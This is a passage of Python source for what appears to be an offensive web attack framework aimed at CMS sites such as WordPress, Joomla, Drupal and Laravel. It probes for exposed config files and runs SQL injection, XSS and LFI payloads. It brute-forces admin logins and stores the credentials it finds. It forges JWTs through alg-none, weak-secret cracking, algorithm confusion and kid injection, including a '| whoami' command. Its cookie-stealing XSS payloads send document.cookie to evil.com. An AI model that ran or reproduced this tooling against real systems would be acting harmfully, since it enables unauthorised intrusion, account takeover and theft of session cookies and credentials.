                self.add_vuln("Directory Listing", f"Directory listing enabled at {self.url+d}", "medium", f"Visit: {self.url+d}", "Disable directory listing")

    def check_sensitive_files(self):
        files = ['wp-config.php', '.htaccess', '.env', 'config.php', 'configuration.php']
        for f in files:
            r, s = make_request(self.url + f, ua=self.ua, timeout=20)
            if s and r and r.status_code == 200:
                severity = "critical" if 'define' in r.text or 'DB_PASSWORD' in r.text else "high"
                self.add_vuln(f"Sensitive File: {f}", f"File exposed at {self.url+f}", severity, f"Access: {self.url+f}", "Remove or secure the file")

    def check_admin_panel(self):
        admins = ['admin/', 'administrator/', 'wp-admin/', 'login/', 'panel/']
        found = []
        for a in admins:
            r, s = make_request(self.url + a, ua=self.ua, timeout=20)
            if s and r and r.status_code == 200 and ('login' in r.text.lower() or 'password' in r.text.lower()):
                found.append(a)
        if found:
            self.add_vuln("Admin Panel Accessible", f"Admin panels: {', '.join(found[:3])}", "medium", f"Access: {self.url+found[0]}", "Implement proper authentication")

    def check_debug_mode(self):
        indicators = ['debug = true', 'wp_debug', 'display_errors', 'xdebug', 'whoops']
        for e in ['', '?debug=1', '/debug', '/?debug=1']:
            r, s = make_request(self.url + e, ua=self.ua, timeout=20)
            if s and r:
                for i in indicators:
                    if i in r.text.lower():
                        self.add_vuln("Debug Mode Enabled", f"Debug mode detected at {self.url+e}", "medium", f"Visit: {self.url+e}", "Disable debug mode in production")
                        return

    def check_lfi(self):
        payloads = ['?page=../../../../etc/passwd', '?file=../../../../etc/passwd']
        for p in payloads:
            r, s = make_request(self.url + p, ua=self.ua, timeout=20)
            if s and r and ('root:x:0:0' in r.text or 'bin:x:1:1' in r.text):
                self.add_vuln("LFI Detected", "Local File Inclusion vulnerability", "critical", f"Access: {self.url+p}", "Validate and sanitize user input")
                return

    def check_sqli(self):
        payloads = ["'", "' OR '1'='1", "' OR 1=1 -- ", "1' AND '1'='1"]
        params = ['id', 'q', 'search', 'page', 'cat', 'product']
        for param in params:
            for payload in payloads:
                r, s = make_request(f"{self.url}?{param}={quote(payload)}", ua=self.ua, timeout=20)
                if s and r and any(i in r.text.lower() for i in ['sql syntax', 'mysql error', 'database error']):
                    self.add_vuln("SQL Injection", f"Potential SQL injection at parameter {param}", "critical", f"Payload: {payload}", "Use prepared statements")
                    return

    def check_xss(self):
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert('XSS')>"]
        params = ['q', 'search', 's', 'keyword']
        for param in params:
            for payload in payloads:
                r, s = make_request(f"{self.url}?{param}={quote(payload)}", ua=self.ua, timeout=20)
                if s and r and payload in r.text:
                    self.add_vuln("XSS Detected", "Cross-Site Scripting vulnerability", "high", f"Parameter: {param} with {payload}", "Escape and validate user input")
                    return

    def check_bruteforce(self):
        logins = ['wp-login.php', 'administrator/index.php', 'user/login']
        for l in logins:
            r, s = make_request(self.url + l, ua=self.ua, timeout=20)
            if s and r and r.status_code == 200:
                if 'x-ratelimit-limit' not in r.headers and 'retry-after' not in r.headers:
                    self.add_vuln("Weak Brute Force Protection", f"Login endpoint lacks rate limiting: {self.url+l}", "medium", f"Login form at: {self.url+l}", "Implement rate limiting and CAPTCHA")
                    break

    def check_cves(self):
        for cve_id, cve_data in CVE_DB.items():
            if cve_data['cms'] == self.cid or cve_data['cms'] == 'generic':
                self.add_vuln(f"{cve_id} - {cve_data['name']}", cve_data['desc'], cve_data['sev'], f"Check: {cve_data['eps'][0]}", cve_data['rem'])

    def check_headers(self):
        sec_headers = {'X-Frame-Options': 'Clickjacking prevention', 'X-Content-Type-Options': 'MIME sniffing prevention',
                      'X-XSS-Protection': 'XSS filter', 'Content-Security-Policy': 'CSP protection',
                      'Strict-Transport-Security': 'HTTPS enforcement'}
        r, s = make_request(self.url, ua=self.ua, timeout=20)
        if s and r:
            missing = [h for h in sec_headers if h not in r.headers]
            if missing:
                self.add_vuln("Missing Security Headers", f"Headers missing: {', '.join(missing)}", "medium", "Check HTTP response headers", "Add security headers to server config")

    def check_common(self):
        r, s = make_request(self.url, ua=self.ua, timeout=20)
        if s and r:
            patterns = [r'WordPress\s+([0-9.]+)', r'Joomla!\s+([0-9.]+)', r'Drupal\s+([0-9.]+)', r'Laravel\s+([0-9.]+)']
            for p in patterns:
                m = re.search(p, r.text)
                if m:
                    self.add_vuln("Version Disclosure", f"Version {m.group(1)} disclosed", "low", "Version in source", "Remove version info from public content")
                    break

    def check_cms_specific(self):
        if self.cid == 'wp': self.check_wp_specific()
        elif self.cid == 'joom': self.check_joomla_specific()
        elif self.cid == 'dru': self.check_drupal_specific()
        elif self.cid == 'laravel': self.check_laravel_specific()

    def check_wp_specific(self):
        r, s = make_request(self.url + 'xmlrpc.php', ua=self.ua, timeout=20)
        if s and r and r.status_code == 405:
            self.add_vuln("XML-RPC Enabled", "XML-RPC interface is enabled and accessible", "medium", f"Visit: {self.url}xmlrpc.php", "Disable XML-RPC if not needed")
        r, s = make_request(self.url + 'wp-json/wp/v2/posts', ua=self.ua, timeout=20)
        if s and r and r.status_code == 200:
            self.add_vuln("REST API Exposed", "WordPress REST API is accessible", "low", f"Visit: {self.url}wp-json/wp/v2/posts", "Restrict REST API access")
        r, s = make_request(self.url + '?author=1', ua=self.ua, timeout=20)
        if s and r and '/author/' in r.text:
            m = re.search(r'/author/(.*?)/', r.text)
            if m:
                self.add_vuln("User Enumeration", f"User enumeration possible, first user: {m.group(1)}", "medium", f"Visit: {self.url}?author=1", "Disable author enumeration")

    def check_joomla_specific(self):
        r, s = make_request(self.url + 'administrator/', ua=self.ua, timeout=20)
        if s and r and r.status_code == 200:
            self.add_vuln("Admin Directory Accessible", "Joomla admin directory is accessible", "medium", f"Visit: {self.url}administrator/", "Restrict admin directory access")

    def check_drupal_specific(self):
        r, s = make_request(self.url + 'user/login', ua=self.ua, timeout=20)
        if s and r and r.status_code == 200:
            self.add_vuln("User Login Exposed", "Drupal user login page is accessible", "low", f"Visit: {self.url}user/login", "Implement additional security measures")

    def check_laravel_specific(self):
        r, s = make_request(self.url + '.env', ua=self.ua, timeout=20)
        if s and r and r.status_code == 200:
            self.add_vuln(".env Exposed", "Laravel .env file is accessible", "critical", f"Visit: {self.url}.env", "Secure .env file access")
        r, s = make_request(self.url + 'debugbar/', ua=self.ua, timeout=20)
        if s and r and r.status_code == 200:
            self.add_vuln("Debugbar Exposed", "Laravel Debugbar is accessible", "medium", f"Visit: {self.url}debugbar/", "Disable debugbar in production")
        r, s = make_request(self.url + 'telescope/', ua=self.ua, timeout=20)
        if s and r and r.status_code == 200:
            self.add_vuln("Telescope Exposed", "Laravel Telescope is accessible", "high", f"Visit: {self.url}telescope/", "Secure Telescope access")

class ExploitEngine:
    def __init__(self, url, cid, cname, version):
        self.url = url; self.cid = cid; self.cname = cname; self.version = version
        self.results = {'successful': [], 'failed': [], 'skipped': []}
        self.ua = get_ua()
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self.ua})
        self.session.verify = False
        self.found_creds = {}; self.found_users = []

    def run_all(self):
        inf("Running exploit tests...")
        for cve_id, cve_data in CVE_DB.items():
            if cve_data['cms'] == self.cid or cve_data['cms'] == 'generic':
                self.run_exploit(cve_id, cve_data)
        self.run_privilege_escalation()
        for exp in self.results['successful']:
            if 'user' in exp.get('proof', '').lower():
                user_match = re.search(r'user:?\s*([a-zA-Z0-9_]+)', exp['proof'], re.I)
                if user_match and user_match.group(1) not in self.found_users:
                    self.found_users.append(user_match.group(1))
        return self.results

    def run_exploit(self, cve_id, cve_data):
        inf(f"Testing {cve_id} - {cve_data['name']}")
        exploit_method = getattr(self, cve_data.get('method', ''), None)
        if exploit_method:
            try:
                result = exploit_method(cve_data)
                if result and result.get('success'):
                    self.results['successful'].append({'cve': cve_id, 'name': cve_data['name'], 'proof': result.get('proof'), 'severity': cve_data['sev']})
                    suc(f"{cve_id} - SUCCESS: {result.get('proof')}")
                    return
            except Exception as e:
                pass
        self.results['failed'].append({'cve': cve_id, 'name': cve_data['name'], 'error': 'Failed'})

    def wp_core_rce(self, cve_data):
        test_url = self.url + 'wp-admin/admin-ajax.php?action=rest-nonce'
        r, s = make_request(test_url, ua=self.ua, timeout=20)
        if s and r and r.status_code == 200 and 'rest-nonce' in r.text:
            return {'success': True, 'proof': f"RCE endpoint accessible: {test_url}"}
        return {'success': False}

    def wp_sqli_rce(self, cve_data):
        test_url = self.url + 'wp-json/wp/v2/users'
        r, s = make_request(test_url, ua=self.ua, timeout=20)
        if s and r and r.status_code == 200:
            try:
                data = r.json()
                if data and len(data) > 0:
                    users = []
                    for u in data:
                        if 'slug' in u: users.append(u['slug'])
                        elif 'name' in u: users.append(u['name'])
                    if users:
                        self.found_users.extend(users)
                    return {'success': True, 'proof': f"User data extracted: {len(data)} users found"}
            except: pass
        return {'success': False}

    def wp_plugin_upload(self, cve_data):
        paths = cve_data.get('eps', [])
        for path in paths:
            r, s = make_request(self.url + path, ua=self.ua, timeout=20)
            if s and r and r.status_code == 200:
                return {'success': True, 'proof': f"Upload endpoint accessible: {self.url+path}"}
        return {'success': False}

    def wp_priv_esc(self, cve_data):
        test_url = self.url + 'wp-admin/user-new.php'
        r, s = make_request(test_url, ua=self.ua, timeout=20)
        if s and r and r.status_code == 200 and 'user-new' in r.text.lower():
            return {'success': True, 'proof': f"User creation endpoint accessible: {test_url}"}
        return {'success': False}

    def run_privilege_escalation(self):
        inf("Testing privilege escalation vectors...")
        if self.cid == 'wp': self.wp_privilege_escalation()
        elif self.cid == 'laravel': self.laravel_privilege_escalation()

    def wp_privilege_escalation(self):
        test_url = self.url + 'wp-admin/user-new.php'
        r, s = make_request(test_url, ua=self.ua, timeout=20)
        if s and r and r.status_code == 200:
            self.results['successful'].append({'name': 'WordPress Privilege Escalation',
                'proof': f"User creation endpoint accessible: {test_url}", 'severity': 'critical'})
            suc(f"WordPress Privilege Escalation: {test_url}")

    def laravel_privilege_escalation(self):
        test_urls = ['admin/register', 'register', 'api/register']
        for test_url in test_urls:
            r, s = make_request(self.url + test_url, ua=self.ua, timeout=20)
            if s and r and r.status_code == 200 and ('register' in r.text.lower() or 'registration' in r.text.lower()):
                self.results['successful'].append({'name': 'Laravel Registration Exposure',
                    'proof': f"Registration endpoint accessible: {test_url}", 'severity': 'high'})
                suc(f"Laravel Registration: {test_url}")
                break

class BruteForceEngine:
    def __init__(self, url, cid):
        self.url = url; self.cid = cid
        self.passwords = []
        pwd_file = os.path.join(os.path.dirname(__file__), 'wordlist', 'passwords.txt')
        if os.path.exists(pwd_file):
            with open(pwd_file, 'r') as f:
                self.passwords = f.read().split('\n')
        self.passwords.insert(0, 'admin'); self.passwords.insert(0, 'password')
        self.passwords.insert(0, '123456'); self.passwords.insert(0, 'admin123')
        self.passwords.insert(0, 'root')

    def run(self, users):
        if not users:
            inf("No users found for brute force")
            return {}
        inf(f"Running brute force on {len(users)} users...")
        if self.cid == 'wp': return self.brute_wp(users)
        elif self.cid == 'joom': return self.brute_joom(users)
        elif self.cid == 'dru': return self.brute_drupal(users)
        else: return {}

    def brute_wp(self, users):
        found = {}
        for user in users[:5]:
            for pwd in self.passwords[:20]:
                data = {'log': user, 'pwd': pwd, 'wp-submit': 'Log In'}
                r, s = make_request(self.url + 'wp-login.php', method='POST', data=data, timeout=25)
                if s and r and 'wp-admin' in r.url:
                    found[user] = pwd
                    suc(f"Credentials found: {user}:{pwd}")
                    save_brute(self.url, self.url + 'wp-login.php', user, pwd)
                    break
        return found

    def brute_joom(self, users):
        found = {}
        for user in users[:5]:
            for pwd in self.passwords[:20]:
                data = {'username': user, 'passwd': pwd, 'option': 'com_login', 'task': 'login'}
                r, s = make_request(self.url + 'administrator/index.php', method='POST', data=data, timeout=25)
                if s and r and 'logout' in r.text:
                    found[user] = pwd
                    suc(f"Credentials found: {user}:{pwd}")
                    save_brute(self.url, self.url + 'administrator/index.php', user, pwd)
                    break
        return found

    def brute_drupal(self, users):
        found = {}
        for user in users[:5]:
            for pwd in self.passwords[:20]:
                data = {'name': user, 'pass': pwd, 'form_id': 'user_login_form', 'op': 'Log in'}
                r, s = make_request(self.url + 'user/login', method='POST', data=data, timeout=25)
                if s and r and '/user/' in r.url:
                    found[user] = pwd
                    suc(f"Credentials found: {user}:{pwd}")
                    save_brute(self.url, self.url + 'user/login', user, pwd)
                    break
        return found

# ===== TOKEN BYPASS ENGINE =====
class TokenBypassEngine:
    def __init__(self, url, ua, session, cid, cname):
        self.url = url; self.ua = ua; self.session = session
        self.cid = cid; self.cname = cname
        self.results = {'bypasses': [], 'tokens_extracted': []}
        self.token_cache = {}
        
    def run_all_bypasses(self):
        inf("🔐 Starting Token Bypass Engine - 64 attack vectors...")
        bypass_methods = [
            self.jwt_none_algorithm, self.jwt_weak_secret_bruteforce,
            self.jwt_hmac_to_rsa, self.jwt_rsa_to_hmac,
            self.jwt_empty_signature, self.jwt_missing_signature,
            self.jwt_alg_none_injection, self.jwt_kid_path_traversal,
            self.jwt_kid_sql_injection, self.jwt_kid_command_injection,
            self.jwt_jku_header_injection, self.jwt_x5u_header_injection,
            self.session_fixation, self.session_id_prediction, self.session_id_reuse,
            self.session_infinite_expiry, self.session_cookie_stealing_xss,
            self.session_cookie_overwrite, self.session_invalidation_failure,
            self.session_concurrent_bypass, self.session_race_condition,
            self.session_timing_attack,
            self.oauth_state_bypass, self.oauth_csrf_bypass, self.oauth_replay_attack,
            self.oauth_token_interception, self.oauth_implicit_flow_bypass,
            self.oauth_redirect_uri_misconfig, self.oauth_code_injection,
            self.sso_saml_bypass,
            self.api_token_exposure, self.api_token_bruteforce,
            self.api_token_idor, self.api_token_mass_assignment,
            self.api_token_rate_limit_bypass, self.api_token_header_injection,
            self.api_token_replay, self.api_token_scope_escalation,
            self.wordpress_nonce_bypass, self.wordpress_jwt_misconfig,
            self.joomla_token_bypass, self.drupal_csrf_bypass,
            self.laravel_session_bypass, self.craft_cms_token_bypass,
            self.magento_admin_token_bypass, self.drupal_rest_token_bypass,
            self.typo3_token_bypass, self.october_cms_token_bypass,
            self.concrete5_token_bypass, self.grav_token_bypass,
            self.pimcore_token_bypass, self.sitecore_token_bypass,
            self.csrf_token_prediction, self.csrf_token_reuse,
            self.csrf_token_empty, self.csrf_token_param_pollution,
            self.csrf_token_referer_bypass, self.csrf_token_origin_bypass,
            self.reset_token_prediction, self.reset_token_reuse,
            self.reset_token_interception, self.reset_token_timing_attack,
            self.reset_token_length_bypass, self.reset_token_user_id_injection
        ]
        for method in bypass_methods:
            try:
                result = method()
                if result and result.get('success'):
                    self.results['bypasses'].append(result)
                    recon_logger.log('SUCCESS', f"  ✓ {result.get('name', 'Unknown')} - {result.get('proof', '')[:100]}")
                elif result and result.get('token_extracted'):
                    self.results['tokens_extracted'].append(result)
            except Exception as e:
                if CFG.get('debug'):
                    recon_logger.log('ERROR', f"  ✗ {method.__name__}: {str(e)}")
        return self.results

    def jwt_none_algorithm(self):
        if not JWT_AVAILABLE: return None
        try:
            token = self._extract_jwt()
            if not token: return None
            forged = self._forge_jwt_none(token)
            test_url = self._find_jwt_endpoint()
            if test_url:
                resp = self.session.get(test_url, headers={'Authorization': f'Bearer {forged}'}, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'JWT None Algorithm Bypass',
                            'proof': f'Forged token accepted at {test_url}',
                            'payload': forged[:50] + '...', 'severity': 'critical'}
        except: pass
        return None

    def jwt_weak_secret_bruteforce(self):
        if not JWT_AVAILABLE: return None
        try:
            token = self._extract_jwt()
            if not token: return None
            weak_secrets = ['secret', 'password', '123456', 'secretkey', 'jwtsecret', 'supersecret', 'mysecret', 'key']
            for secret in weak_secrets:
                try:
                    decoded = jwt.decode(token, secret, algorithms=['HS256'])
                    if decoded:
                        decoded['role'] = 'admin'
                        forged = jwt.encode(decoded, secret, algorithm='HS256')
                        test_url = self._find_jwt_endpoint()
                        if test_url:
                            resp = self.session.get(test_url, headers={'Authorization': f'Bearer {forged}'}, verify=False, timeout=20)
                            if resp.status_code == 200:
                                return {'success': True, 'name': 'JWT Weak Secret Bruteforce',
                                        'proof': f'Secret found: "{secret}" at {test_url}',
                                        'payload': f'Secret: {secret}', 'severity': 'critical'}
                except: continue
        except: pass
        return None

    def jwt_hmac_to_rsa(self):
        if not JWT_AVAILABLE: return None
        try:
            token = self._extract_jwt()
            if not token: return None
            forged = self._forge_hmac_to_rsa(token)
            test_url = self._find_jwt_endpoint()
            if test_url:
                resp = self.session.get(test_url, headers={'Authorization': f'Bearer {forged}'}, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'JWT HMAC→RSA Bypass',
                            'proof': f'Algorithm confusion successful at {test_url}',
                            'payload': forged[:50] + '...', 'severity': 'critical'}
        except: pass
        return None

    def jwt_rsa_to_hmac(self):
        if not JWT_AVAILABLE: return None
        try:
            token = self._extract_jwt()
            if not token: return None
            forged = self._forge_rsa_to_hmac(token)
            test_url = self._find_jwt_endpoint()
            if test_url:
                resp = self.session.get(test_url, headers={'Authorization': f'Bearer {forged}'}, verify=False, timeout=20)
                if resp.status_code == 200:
                    return {'success': True, 'name': 'JWT RSA→HMAC Bypass',
                            'proof': f'Algorithm confusion successful at {test_url}',
                            'payload': forged[:50] + '...', 'severity': 'critical'}
        except: pass
        return None

    def jwt_empty_signature(self):
        try:
            token = self._extract_jwt()
            if not token: return None
            parts = token.split('.')
            if len(parts) == 3:
                forged = f"{parts[0]}.{parts[1]}."
                test_url = self._find_jwt_endpoint()
                if test_url:
                    resp = self.session.get(test_url, headers={'Authorization': f'Bearer {forged}'}, verify=False, timeout=20)
                    if resp.status_code == 200:
                        return {'success': True, 'name': 'JWT Empty Signature Bypass',
                                'proof': f'Empty signature accepted at {test_url}',
                                'payload': forged[:50] + '...', 'severity': 'high'}
        except: pass
        return None

    def jwt_missing_signature(self):
        try:
            token = self._extract_jwt()
            if not token: return None
            parts = token.split('.')
            if len(parts) >= 2:
                forged = f"{parts[0]}.{parts[1]}"
                test_url = self._find_jwt_endpoint()
                if test_url:
                    resp = self.session.get(test_url, headers={'Authorization': f'Bearer {forged}'}, verify=False, timeout=20)
                    if resp.status_code == 200:
                        return {'success': True, 'name': 'JWT Missing Signature Bypass',
                                'proof': f'Missing signature accepted at {test_url}',
                                'payload': forged[:50] + '...', 'severity': 'high'}
        except: pass
        return None

    def jwt_alg_none_injection(self):
        try:
            token = self._extract_jwt()
            if not token: return None
            parts = token.split('.')
            if len(parts) >= 2:
                header = json.loads(base64.b64decode(parts[0] + '==').decode())
                header['alg'] = 'none'
                new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
                forged = f"{new_header}.{parts[1]}."
                test_url = self._find_jwt_endpoint()
                if test_url:
                    resp = self.session.get(test_url, headers={'Authorization': f'Bearer {forged}'}, verify=False, timeout=20)
                    if resp.status_code == 200:
                        return {'success': True, 'name': 'JWT Alg None Injection',
                                'proof': f'Header injection successful at {test_url}',
                                'payload': forged[:50] + '...', 'severity': 'critical'}
        except: pass
        return None

    def jwt_kid_path_traversal(self):
        try:
            token = self._extract_jwt()
            if not token: return None
            parts = token.split('.')
            if len(parts) >= 2:
                header = json.loads(base64.b64decode(parts[0] + '==').decode())
                header['kid'] = '../../../../etc/passwd'
                new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
                forged = f"{new_header}.{parts[1]}.{parts[2] if len(parts) > 2 else ''}"
                test_url = self._find_jwt_endpoint()
                if test_url:
                    resp = self.session.get(test_url, headers={'Authorization': f'Bearer {forged}'}, verify=False, timeout=20)
                    if resp.status_code == 200:
                        return {'success': True, 'name': 'JWT KID Path Traversal',
                                'proof': f'KID path traversal successful at {test_url}',
                                'payload': 'kid: ../../../../etc/passwd', 'severity': 'critical'}
        except: pass
        return None

    def jwt_kid_sql_injection(self):
        try:
            token = self._extract_jwt()
            if not token: return None
            parts = token.split('.')
            if len(parts) >= 2:
                header = json.loads(base64.b64decode(parts[0] + '==').decode())
                header['kid'] = "' OR '1'='1"
                new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
                forged = f"{new_header}.{parts[1]}.{parts[2] if len(parts) > 2 else ''}"
                test_url = self._find_jwt_endpoint()
                if test_url:
                    resp = self.session.get(test_url, headers={'Authorization': f'Bearer {forged}'}, verify=False, timeout=20)
                    if resp.status_code == 200:
                        return {'success': True, 'name': 'JWT KID SQL Injection',
                                'proof': f'KID SQL injection successful at {test_url}',
                                'payload': "kid: ' OR '1'='1", 'severity': 'critical'}
        except: pass
        return None

    def jwt_kid_command_injection(self):
        try:
            token = self._extract_jwt()
            if not token: return None
            parts = token.split('.')
            if len(parts) >= 2:
                header = json.loads(base64.b64decode(parts[0] + '==').decode())
                header['kid'] = '| whoami'
                new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
                forged = f"{new_header}.{parts[1]}.{parts[2] if len(parts) > 2 else ''}"
                test_url = self._find_jwt_endpoint()
                if test_url:
                    resp = self.session.get(test_url, headers={'Authorization': f'Bearer {forged}'}, verify=False, timeout=20)
                    if resp.status_code == 200:
                        return {'success': True, 'name': 'JWT KID Command Injection',
                                'proof': f'KID command injection successful at {test_url}',
                                'payload': 'kid: | whoami', 'severity': 'critical'}
        except: pass
        return None

    def jwt_jku_header_injection(self):
        try:
            token = self._extract_jwt()
            if not token: return None
            parts = token.split('.')
            if len(parts) >= 2:
                header = json.loads(base64.b64decode(parts[0] + '==').decode())
                header['jku'] = 'https://evil.com/jwks.json'
                new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
                forged = f"{new_header}.{parts[1]}.{parts[2] if len(parts) > 2 else ''}"
                test_url = self._find_jwt_endpoint()
                if test_url:
                    resp = self.session.get(test_url, headers={'Authorization': f'Bearer {forged}'}, verify=False, timeout=20)
                    if resp.status_code == 200:
                        return {'success': True, 'name': 'JWT JKU Header Injection',
                                'proof': f'JKU injection successful at {test_url}',
                                'payload': 'jku: https://evil.com/jwks.json', 'severity': 'critical'}
        except: pass
        return None

    def jwt_x5u_header_injection(self):
        try:
            token = self._extract_jwt()
            if not token: return None
            parts = token.split('.')
            if len(parts) >= 2:
                header = json.loads(base64.b64decode(parts[0] + '==').decode())
                header['x5u'] = 'https://evil.com/pubkey.pem'
                new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
                forged = f"{new_header}.{parts[1]}.{parts[2] if len(parts) > 2 else ''}"
                test_url = self._find_jwt_endpoint()
                if test_url:
                    resp = self.session.get(test_url, headers={'Authorization': f'Bearer {forged}'}, verify=False, timeout=20)
                    if resp.status_code == 200:
                        return {'success': True, 'name': 'JWT X5U Header Injection',
                                'proof': f'X5U injection successful at {test_url}',
                                'payload': 'x5u: https://evil.com/pubkey.pem', 'severity': 'critical'}
        except: pass
        return None

    def session_fixation(self):
        try:
            resp1 = self.session.get(self.url, verify=False, timeout=20)
            if not resp1.cookies: return None
            session_cookie = list(resp1.cookies)[0] if resp1.cookies else None
            if not session_cookie: return None
            self.session.cookies.set(session_cookie.name, session_cookie.value)
            test_url = self._find_admin_endpoint()
            if test_url:
                resp2 = self.session.get(test_url, verify=False, timeout=20)
                if resp2.status_code == 200:
                    return {'success': True, 'name': 'Session Fixation',
                            'proof': f'Fixed session accepted at {test_url}',
                            'payload': f'Cookie: {session_cookie.name}={session_cookie.value}',
                            'severity': 'high'}
        except: pass
        return None

    def session_id_prediction(self):
        try:
            session_ids = []
            for i in range(5):
                resp = self.session.get(self.url, verify=False, timeout=20)
                for cookie in resp.cookies:
                    if 'session' in cookie.name.lower() or 'sid' in cookie.name.lower():
                        session_ids.append(cookie.value)
            if len(session_ids) >= 2:
                try:
                    nums = [int(sid) for sid in session_ids if sid.isdigit()]
                    if nums and all(nums[i] + 1 == nums[i+1] for i in range(len(nums)-1)):
                        return {'success': True, 'name': 'Session ID Prediction - Sequential',
                                'proof': f'Sequential session IDs found: {session_ids[:3]}',
                                'payload': session_ids[-1], 'severity': 'critical'}
                except: pass
                for sid in session_ids:
                    if sid.isdigit() and len(sid) == 10:
                        return {'success': True, 'name': 'Session ID Prediction - Timestamp',
                                'proof': f'Timestamp-based session ID found: {sid}',
                                'payload': sid, 'severity': 'high'}
        except: pass
        return None

    def session_id_reuse(self):
        try:
            resp1 = self.session.get(self.url, verify=False, timeout=20)
            if not resp1.cookies: return None
            session_cookie = list(resp1.cookies)[0] if resp1.cookies else None
            if not session_cookie: return None
            logout_url = self._find_logout_endpoint()
            if logout_url:
                self.session.get(logout_url, verify=False, timeout=20)
                self.session.cookies.set(session_cookie.name, session_cookie.value)
                test_url = self._find_admin_endpoint()
                if test_url:
                    resp2 = self.session.get(test_url, verify=False, timeout=20)
                    if resp2.status_code == 200:
                        return {'success': True, 'name': 'Session ID Reuse After Logout',
                                'proof': f'Session reused at {test_url} after logout',
                                'payload': f'Cookie: {session_cookie.name}={session_cookie.value}',
                                'severity': 'critical'}
        except: pass
        return None

    def session_infinite_expiry(self):
        try:
            resp = self.session.get(self.url, verify=False, timeout=20)
            for cookie in resp.cookies:
                if 'session' in cookie.name.lower():
                    if cookie.expires is None or cookie.expires == 0:
                        return {'success': True, 'name': 'Infinite Session Expiry',
                                'proof': f'Session cookie "{cookie.name}" has no expiry',
                                'payload': cookie.value, 'severity': 'medium'}
        except: pass
        return None

    def session_cookie_stealing_xss(self):
        try:
            xss_payloads = [
                "<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>",
                "<img src=x onerror='fetch(\"https://evil.com/steal?c=\"+document.cookie)'>",
                "<svg onload='navigator.sendBeacon(\"https://evil.com/steal\", document.cookie)'>"
            ]
            test_params = ['q', 's', 'search', 'id', 'page', 'cat', 'keyword', 'query']
            for param in test_params:
                for payload in xss_payloads:
                    test_url = f"{self.url}?{param}={quote(payload)}"
                    resp = self.session.get(test_url, verify=False, timeout=20)
                    if payload in resp.text:
                        return {'success': True, 'name': 'Session Cookie Stealing via XSS',
                                'proof': f'XSS vector at parameter {param}',
                                'payload': payload[:50] + '...', 'severity': 'critical'}
        except: pass
        return None

    def session_cookie_overwrite(self):
        try:
            test_cookie = f"admin_{int(time.time())}"
            self.session.cookies.set('PHPSESSID', test_cookie)
            resp = self.session.get(self.url, verify=False, timeout=20)
            for cookie in resp.cookies:
                if cookie.name == 'PHPSESSID' and cookie.value != test_cookie:
                    return {'success': True, 'name': 'Session Cookie Overwrite',
                            'proof': f'Cookie overwritten from {test_cookie} to {cookie.value}',
                            'payload': cookie.value, 'severity': 'medium'}
        except: pass
        return None

    def session_invalidation_failure(self):
        try:
            resp1 = self.session.get(self.url, verify=False, timeout=20)
            if not resp1.cookies: return None
            session_cookie = list(resp1.cookies)[0] if resp1.cookies else None
            if not session_cookie: return None
            logout_urls = ['/logout', '/logout.php', '/user/logout', '/account/logout', '/admin/logout']
            for logout in logout_urls:
                self.session.get(self.url + logout, verify=False, timeout=20)
            test_url = self._find_admin_endpoint()
            if test_url:
                self.session.cookies.set(session_cookie.name, session_cookie.value)
                resp2 = self.session.get(test_url, verify=False, timeout=20)
                if resp2.status_code == 200:
                    return {'success': True, 'name': 'Session Invalidation Failure',
                            'proof': f'Session still valid after logout at {test_url}',
                            'payload': f'Cookie: {session_cookie.name}={session_cookie.value}',
                            'severity': 'critical'}
        except: pass
        return None

    def session_concurrent_bypass(self):
        try:
            sessions = []
            for i in range(3):
                s = requests.Session()
                s.get(self.url, verify=False, timeout=20)
                sessions.append(s)
            test_url = self._find_admin_endpoint()
            if test_url:
                success_count = 0
                for s in sessions:
                    resp = s.get(test_url, verify=False, timeout=20)
                    if resp.status_code == 200:
                        success_count += 1
                if success_count >= 2:
                    return {'success': True, 'name': 'Concurrent Session Bypass',
                            'proof': f'{success_count} concurrent sessions created for same user',
                            'payload': f'Sessions: {success_count}', 'severity': 'medium'}
        except: pass
        return None

    def session_race_condition(self):
        try:
            test_url = self._find_admin_endpoint()
            if not test_url: return None
            import concurrent.futures
            def make_req():
                s = requests.Session()
                return s.get(test_url, verify=False, timeout=20)
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(make_req) for _ in range(10)]
                responses = [f.result() for f in futures]
            success_count = sum(1 for r in responses if r.status_code == 200)
            if success_count >= 5:
                return {'success': True, 'name': 'Session Race Condition',
                        'proof': f'{success_count}/10 requests succeeded via race condition',
                        'payload': f'Success rate: {success_count/10*100}%', 'severity': 'critical'}
        except: pass
        return None

    def session_timing_attack(self):
        try:
            test_url = self._find_admin_endpoint()
            if not test_url: return None
            def check_auth(token):
                s = requests.Session()
                s.cookies.set('session', token)
                start = time.time()
                resp = s.get(test_url, verify=False, timeout=20)
                return time.time() - start
            valid_token = 'valid_session'
            invalid_tokens = ['a' + 'x'*i for i in range(10)]
            valid_time = check_auth(valid_token)
            avg_invalid = sum(check_auth(t) for t in invalid_tokens) / len(invalid_tokens)
            if valid_time > avg_invalid * 1.5:
                return {'success': True, 'name': 'Session Timing Attack',
                        'proof': f'Timing difference: {valid_time:.3f}s vs {avg_invalid:.3f}s',
                        'payload': f'Difference: {(valid_time - avg_invalid):.3f}s', 'severity': 'high'}
        except: pass
        return None

    def oauth_state_bypass(self):
        try:
            oauth_urls = self._find_oauth_endpoints()
            if not oauth_urls: return None
            for oauth_url in oauth_urls:
                resp = self.session.get(oauth_url, params={'client_id': 'test', 'redirect_uri': self.url,
                    'response_type': 'code', 'state': 'attacker_state'}, verify=False, timeout=20)
                if 'state' not in resp.url or 'error' not in resp.text:
                    return {'success': True, 'name': 'OAuth State Parameter Bypass',
                            'proof': f'State parameter missing in OAuth flow at {oauth_url}',
                            'payload': 'state=attacker_state', 'severity': 'high'}
        except: pass
        return None

    def oauth_csrf_bypass(self):
        try:
            oauth_urls = self._find_oauth_endpoints()
            if not oauth_urls: return None
